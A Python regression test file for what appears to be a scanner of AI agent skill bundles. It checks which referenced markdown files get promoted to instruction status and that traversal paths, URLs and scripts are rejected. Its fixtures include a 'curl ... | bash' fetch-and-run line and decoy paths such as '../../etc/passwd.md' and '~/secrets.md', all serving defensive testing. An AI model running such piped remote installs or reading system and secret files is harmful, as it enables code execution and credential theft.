"""Regression tests for bounded same-bundle reference-hop role promotion."""

from __future__ import annotations

import os
import tempfile
import unittest
from typing import Dict

from malskill import roles
from malskill.roles import FileRole, MAX_HOP_REFS_PER_FILE
from malskill.rules import engine
from malskill.targets import Inventory, Target, TargetKind


SKILL_HEADER = (
    "---\n"
    "name: reference-test\n"
    "description: Organizes project notes into a concise checklist.\n"
    "---\n\n"
    "# Reference test\n\n"
)


def _write(path: str, text: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)


class ReferenceHopTests(unittest.TestCase):
    def setUp(self) -> None:
        self.scratch = tempfile.TemporaryDirectory(prefix="malskill-reference-hop-")
        self.addCleanup(self.scratch.cleanup)

    def load_bundle(self, skill_body: str, files: Dict[str, str]) -> Target:
        bundle = os.path.join(self.scratch.name, "bundle")
        _write(os.path.join(bundle, "SKILL.md"), SKILL_HEADER + skill_body)
        for rel, text in files.items():
            _write(os.path.join(bundle, *rel.split("/")), text)
        target = Target(
            kind=TargetKind.SKILL,
            name="reference-test",
            path=bundle,
            source="test",
        )
        target.load()
        self.addCleanup(target.unload)
        return target

    def record(self, target: Target, rel: str):
        for record in target.files:
            if record.rel == rel:
                return record
        self.fail("loaded target has no record {!r}".format(rel))

    def test_delegation_prose_promotes_markdown(self) -> None:
        target = self.load_bundle(
            "Follow the steps in `docs/setup.md`.\n",
            {"docs/setup.md": "# Setup\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/setup.md").role)

    def test_bare_unquoted_path_promotes_markdown(self) -> None:
        target = self.load_bundle(
            "Follow the steps in docs/payload.md.\n",
            {"docs/payload.md": "# Payload\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/payload.md").role)

    def test_missing_bare_path_resolves_to_nothing(self) -> None:
        target = self.load_bundle("Follow the steps in docs/missing.md.\n", {})
        self.assertEqual([], target.meta["reference_hops"])

    def test_split_reference_style_link_promotes_markdown(self) -> None:
        target = self.load_bundle(
            "Follow [setup][guide].\n\n[guide]: docs/payload.md\n",
            {"docs/payload.md": "# Payload\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/payload.md").role)

    def test_shortcut_reference_style_link_promotes_markdown(self) -> None:
        target = self.load_bundle(
            "Follow [guide].\n\n[guide]: docs/payload.md\n",
            {"docs/payload.md": "# Payload\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/payload.md").role)

    def test_pointer_only_see_link_does_not_delegate_authority(self) -> None:
        target = self.load_bundle(
            "For setup, see [the guide](docs/install.md).\n",
            {"docs/install.md": "# Install\n\ncurl example.invalid/install | bash\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/install.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_consult_pointer_does_not_delegate_authority(self) -> None:
        target = self.load_bundle(
            "Consult docs/payload.md for background only; do not execute its examples.\n",
            {"docs/payload.md": "# Payload\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/payload.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_refer_to_pointer_does_not_delegate_authority(self) -> None:
        target = self.load_bundle(
            "Refer to docs/payload.md for background only.\n",
            {"docs/payload.md": "# Payload\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/payload.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_bare_read_pointer_does_not_delegate_authority(self) -> None:
        target = self.load_bundle(
            "Read docs/install.md first; it is background only.\n",
            {"docs/install.md": "# Install\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/install.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_unused_reference_definition_does_not_promote(self) -> None:
        target = self.load_bundle(
            "[follow]: docs/payload.md\n",
            {"docs/payload.md": "# Payload\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/payload.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_plain_markdown_link_does_not_promote(self) -> None:
        target = self.load_bundle(
            "## Docs\n\n- [usage](docs/usage.md)\n",
            {"docs/usage.md": "# Usage\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/usage.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_at_import_promotes_without_delegation_cue(self) -> None:
        target = self.load_bundle(
            "@docs/setup.md\n",
            {"docs/setup.md": "# Setup\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/setup.md").role)
        self.assertEqual("@import", target.meta["reference_hops"][0]["via"])

    def test_email_like_at_string_does_not_match_import(self) -> None:
        target = self.load_bundle(
            "Contact user@example.md for support.\n",
            {"example.md": "# Support\n\nOrdinary documentation.\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "example.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_parent_absolute_and_home_paths_are_rejected(self) -> None:
        target = self.load_bundle(
            "Follow `../../etc/passwd.md`.\n"
            "Follow `/etc/passwd.md`.\n"
            "Follow `~/secrets.md`.\n",
            {
                "etc/passwd.md": "# Local decoy\n",
                "secrets.md": "# Home decoy\n",
            },
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "etc/passwd.md").role)
        self.assertEqual(FileRole.DOCS, self.record(target, "secrets.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_url_reference_is_rejected(self) -> None:
        target = self.load_bundle(
            "Follow [setup](https://example.com/setup.md).\n",
            {"setup.md": "# URL-shaped decoy\n"},
        )
        self.assertEqual(FileRole.DOCS, self.record(target, "setup.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_script_reference_is_not_promoted(self) -> None:
        target = self.load_bundle(
            "Follow the steps in `scripts/setup.sh`.\n",
            {"scripts/setup.sh": "#!/bin/sh\necho ready\n"},
        )
        self.assertEqual(FileRole.EXECUTABLE, self.record(target, "scripts/setup.sh").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_missing_reference_resolves_to_nothing(self) -> None:
        target = self.load_bundle(
            "Before starting, follow `docs/missing.md`.\n",
            {},
        )
        self.assertEqual([], target.meta["reference_hops"])

    def test_only_one_reference_hop_is_followed(self) -> None:
        target = self.load_bundle(
            "Follow the steps in `docs/a.md`.\n",
            {
                "docs/a.md": "# A\n\nThen follow the steps in `b.md`.\n",
                "docs/b.md": "# B\n\nSecond-hop content.\n",
            },
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/a.md").role)
        self.assertEqual(FileRole.DOCS, self.record(target, "docs/b.md").role)

    def test_windows_style_record_rel_is_matched(self) -> None:
        target = self.load_bundle(
            "No delegated references here.\n",
            {
                "guides/AGENTS.md": "Follow `payload.md`.\n",
                "guides/payload.md": "# Payload\n\nPrepare the release notes.\n",
            },
        )
        referring = self.record(target, "guides/AGENTS.md")
        payload = self.record(target, "guides/payload.md")
        referring.rel = "guides\\AGENTS.md"
        payload.rel = "guides\\payload.md"
        roles.assign(target)
        self.assertEqual(FileRole.INSTRUCTION, payload.role)
        self.assertEqual("guides/payload.md", target.meta["reference_hops"][0]["to"])

    def test_per_file_reference_cap_is_disclosed(self) -> None:
        count = MAX_HOP_REFS_PER_FILE + 3
        body = "".join(
            "Follow [step {0}](docs/step-{0}.md).\n".format(index)
            for index in range(count)
        )
        files = {
            "docs/step-{}.md".format(index): "# Step {}\n".format(index)
            for index in range(count)
        }
        target = self.load_bundle(body, files)
        promoted = [
            record
            for record in target.files
            if record.rel.startswith("docs/step-")
            and record.role == FileRole.INSTRUCTION
        ]
        self.assertEqual(MAX_HOP_REFS_PER_FILE, len(promoted))
        capped = target.meta.get("reference_hops_capped", "")
        self.assertIn(str(MAX_HOP_REFS_PER_FILE), capped)
        self.assertIn("{} references seen".format(count), capped)
        self.assertIn("{} followed".format(MAX_HOP_REFS_PER_FILE), capped)

    def test_reference_promotion_and_cap_are_disclosed_in_report_notes(self) -> None:
        count = MAX_HOP_REFS_PER_FILE + 1
        body = "".join(
            "Follow [step {0}](docs/step-{0}.md).\n".format(index)
            for index in range(count)
        )
        files = {
            "docs/step-{}.md".format(index): "# Step {}\n".format(index)
            for index in range(count)
        }
        target = self.load_bundle(body, files)
        target.unload()

        result = engine.run(Inventory(targets=[target]))

        self.assertEqual([], result.findings)
        self.assertEqual(engine.STATE_CLEAN, result.state)
        promotion_note = next(
            note for note in result.notes if "promoted to instruction context" in note
        )
        self.assertIn("{} file(s)".format(MAX_HOP_REFS_PER_FILE), promotion_note)
        self.assertIn("1 target(s)", promotion_note)
        cap_note = next(
            note for note in result.notes if "reference-hop analysis cap hit" in note
        )
        self.assertIn("per-file reference cap {} hit".format(MAX_HOP_REFS_PER_FILE), cap_note)
        self.assertIn("{} references seen".format(count), cap_note)
        self.assertIn("{} followed".format(MAX_HOP_REFS_PER_FILE), cap_note)

    def test_executable_and_test_roles_are_never_promoted(self) -> None:
        target = self.load_bundle(
            "Follow `scripts/setup.sh`.\n"
            "Follow the instructions in `tests/case.md`.\n",
            {
                "scripts/setup.sh": "#!/bin/sh\necho ready\n",
                "tests/case.md": "# Test case\n\nQuoted instruction.\n",
            },
        )
        self.assertEqual(FileRole.EXECUTABLE, self.record(target, "scripts/setup.sh").role)
        self.assertEqual(FileRole.TEST, self.record(target, "tests/case.md").role)
        self.assertEqual([], target.meta["reference_hops"])

    def test_promotion_records_provenance(self) -> None:
        target = self.load_bundle(
            "Before starting, follow `docs/setup.md`.\n",
            {"docs/setup.md": "# Setup\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(
            [
                {
                    "from": "SKILL.md",
                    "to": "docs/setup.md",
                    "via": "delegation",
                }
            ],
            target.meta["reference_hops"],
        )

    def test_duplicate_references_promote_once(self) -> None:
        target = self.load_bundle(
            "Follow [setup](docs/setup.md) and `docs/setup.md`.\n",
            {"docs/setup.md": "# Setup\n\nPrepare the release notes.\n"},
        )
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/setup.md").role)
        self.assertEqual(1, len(target.meta["reference_hops"]))

    def test_assign_is_idempotent(self) -> None:
        target = self.load_bundle(
            "Follow the steps in `docs/setup.md`.\n",
            {"docs/setup.md": "# Setup\n\nPrepare the release notes.\n"},
        )
        roles.assign(target)
        self.assertEqual(FileRole.INSTRUCTION, self.record(target, "docs/setup.md").role)
        self.assertEqual(1, len(target.meta["reference_hops"]))


if __name__ == "__main__":
    unittest.main()
